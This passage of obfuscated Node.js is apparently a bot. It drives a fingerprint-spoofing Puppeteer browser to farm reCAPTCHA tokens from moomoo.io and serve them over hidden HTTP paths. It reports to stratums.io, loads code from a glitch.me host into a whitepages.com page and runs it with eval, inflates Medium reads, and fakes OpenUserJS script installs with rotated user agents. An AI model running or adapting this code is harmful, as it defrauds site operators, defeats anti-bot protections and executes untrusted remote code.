      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + a0(0x7) + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x18) + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + Z(0x6),
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1984 + -0x25f5 * 0x1 + -0x3f79 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a2 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x3d * 0x37 + 0x104d * 0x1 + -0x2 * 0x199)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k[a2(0xf)];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x11b6 * -0x2 + -0x8 * -0xe5 + 0x1ca8), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x16c4 + -0x1024 + 0x4c * -0x15), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x481 * -0x5 + 0xe0c + 0xfd * -0x25;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1d6b * 0x1 + 0x1db9 + 0x4 * -0xec9; w < getRandomInt(-0xdcc + 0x21cb * 0x1 + -0x13fe, 0xda * 0x16 + -0x6f0 * -0x4 + 0x3 * -0xf7d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xf22d + 0x1 * -0x34c1 + 0x2cf4);
        }
      }();
    }, -0x3 * 0x7db + 0x121b + -0xd6 * -0x7), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a3 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x243c + -0x5c5 + 0x1 * 0x2a01;
      const x = await v[a3(0x19)]();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1f7 * 0x13 + -0x1fa * 0x2 + 0x2949 * 0x1, -0x17f5 + 0x4d * 0x70 + 0x1 * -0x989)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1fa1 * 0x4 + -0x4 * -0x396b + -0xef00);
    }, -0x21 + 0x7ed * 0x2 + -0xf55), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xc11 + -0x18 * -0x48 + -0x551 * -0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x526 * 0x5 + -0x7 * -0x3a7 + 0x7eb * -0x5), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xc70 + -0x147 * 0x7 + -0xd * -0x1a5), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x512bb + -0x68ab3 * -0x4 + -0x1181e7);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x106a + -0x16c + -0xe9a * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x574 + 0x1d00 + 0x1 * -0x21ac);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3aaf + -0x344f + 0x8e * 0x101);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x13b6 + -0x1a2c + -0x1 * -0x2de2);
    let h = e[f];
    if (b['efDQaN'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2d * 0xc3 + -0x4 * 0x4bd + -0xf53, s, t, u = -0x2c4 + 0x1b7 * -0xf + 0x1c7d; t = n['charAt'](u++); ~t && (s = r % (0xa1f * -0x1 + 0x7b3 * 0x3 + -0x1da * 0x7) ? s * (-0x38 + -0x73 + -0x2f * -0x5) + t : t, r++ % (-0x1 * 0xb16 + 0x15f1 + -0x4b * 0x25)) ? p += String['fromCharCode'](0xa0 * -0xa + -0x1 * -0x12be + 0x3d5 * -0x3 & s >> (-(-0x1d32 + -0x2 * 0x61f + 0x2972) * r & -0x5a5 + 0x0 + 0x1 * 0x5ab)) : 0xded + -0x1b0e + 0xd21) {
          t = o['indexOf'](t);
        }
        for (let v = -0x10af + -0x25 * -0x4a + 0x5fd, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x18b4 + -0x140 + -0x1764))['slice'](-(-0xa8a + -0x830 + 0x12bc));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1f94 + 0x2 * 0x5a6 + 0x1448,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x933 * 0x1 + -0x1 * -0x1abf + -0x23f2; u < 0x2 * 0x529 + -0x1b94 + 0x2 * 0x921; u++) {
          p[u] = u;
        }
        for (u = 0x3 * -0x44f + 0x23e6 + -0x16f9 * 0x1; u < -0xef * 0x15 + 0x1 * 0x1374 + 0x127; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x439 * 0x6 + -0x3c4 + 0x1e1a), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x204a + 0xd * 0x26 + 0x74 * 0x43, q = 0x2 * -0x7a2 + 0x1078 + 0x2 * -0x9a;
        for (let v = -0x128c + -0xad * 0xd + 0x1b55 * 0x1; v < n['length']; v++) {
          u = (u + (-0x75 * 0x43 + -0x4c * 0x3b + 0x3024)) % (0x1845 + 0xc04 * 0x1 + -0x2349), q = (q + p[u]) % (0xfe3 + 0xa13 + -0x163 * 0x12), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2204 + 0x5 * -0x215 + 0x1d * 0x191)]);
        }
        return t;
      };
      b['whfrhd'] = m, c = arguments, b['efDQaN'] = !![];
    }
    const j = e[0x21b9 + -0xcf9 * 0x1 + 0x4 * -0x530],
      k = f + j,
      l = c[k];
    return !l ? (b['qxtqNA'] === undefined && (b['qxtqNA'] = !![]), h = b['whfrhd'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d,
    a4 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x779 + -0x1a32 + -0x1 * -0x12ba) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x17c2 + 0x2 * 0xeda + -0x5f1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x7 * 0x2cd + 0x914 + 0xa87, D['indexOf']('\x20'));
        return B ? E['slice'](-0xe21 + 0x18db + 0x2 * -0x55d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x215b * 0x1 + 0x813 + -0x12f * 0x2),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x23a8 + -0x16fe + 0x1a66),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a4(0x3, '!KB&') + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + a4(0xe, 'KgBQ') + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + a5(0x15),
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
